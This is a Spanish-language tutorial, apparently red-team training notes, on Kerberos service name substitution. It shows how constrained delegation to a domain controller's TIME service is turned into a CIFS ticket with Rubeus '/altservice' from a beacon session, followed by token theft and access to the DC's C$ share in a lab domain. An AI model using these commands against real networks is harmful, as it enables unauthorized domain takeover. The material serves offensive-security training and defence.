La sustitución del nombre de servicio permite "intercambiar" un ticket de servicio por el de otro servicio distinto. Suena raro, pero tiene una base técnica concreta y es muy útil cuando la delegación que hemos conseguido apunta a un servicio poco aprovechable.

---

#### Por qué es posible

Los mensajes AS-REP y TGS-REP comparten la estructura **KDC-REP**. Dentro del ticket hay una parte cifrada (con el principal y la clave de sesión), pero el **SPN** (campo `sname`) va **en claro** y, además, **no entra en el cálculo del checksum** del ticket.

Eso significa que si obtienes un ticket para, por ejemplo, `HTTP/PC1`, puedes sobrescribir ese campo con otro SPN como `CIFS/PC1` y el ticket sigue siendo válido. La única condición: el SPN sustituido tiene que correr **bajo la misma cuenta** que el original (no puedes cambiar `HTTP/PC1` por `CIFS/PC2`). Funciona porque, si ambos servicios corren bajo la misma cuenta, la clave de sesión del ticket está cifrada con la misma clave, así que el servicio sustituido puede descifrarlo igualmente.

#### Para qué sirve

Es especialmente útil en delegación restringida cuando el servicio al que puedes delegar no sirve para moverte. Por ejemplo, aquí `lon-ws-1` solo puede delegar al servicio **TIME** en el DC:

```
sAMAccountName: LON-WS-1$
msDS-AllowedToDelegateTo: time/lon-dc-1.contoso.com, time/lon-dc-1
```

TIME no da acceso remoto. Pero podemos pedir el ticket para TIME y, al vuelo, sustituir el servicio por **CIFS** (o el que queramos) con `/altservice`.

#### El comando

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:doIFn[...recortado...]5DT00= /impersonateuser:Administrator /nowrap
```

- `/user` → el principal (equipo) configurado para delegar.
- `/msdsspn` → el servicio al que tiene permiso delegar (TIME, el "inútil").
- `/altservice` → el servicio por el que lo sustituimos en el ticket final (CIFS).
- `/ticket` → el TGT del principal.
- `/impersonateuser` → usuario a suplantar.

`/altservice` admite **una lista separada por comas** (`/altservice:cifs,host,http`), generando varios tickets de golpe.

Rubeus hace S4U2self + S4U2proxy y, al final, sustituye el nombre del servicio:

```
[+] S4U2self success!
[+] S4U2proxy success!
[*] Substituting alternative service name 'cifs'
[*] base64(ticket.kirbi) for SPN 'cifs/lon-dc-1':
      doIGf[...recortado...]RjLTE=
```

Importamos el ticket CIFS resultante y accedemos al `C$`:

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /username:Administrator /password:FakePass /ticket:doIGf[...recortado...]RjLTE=
[+] ProcessID : 2548
beacon> steal_token 2548
beacon> ls \\lon-dc-1\c$
 [...listado del C$...]
```

En resumen: un permiso de delegación aparentemente inútil (TIME) se convierte en acceso completo al equipo gracias a que el SPN del ticket no está protegido por el checksum.
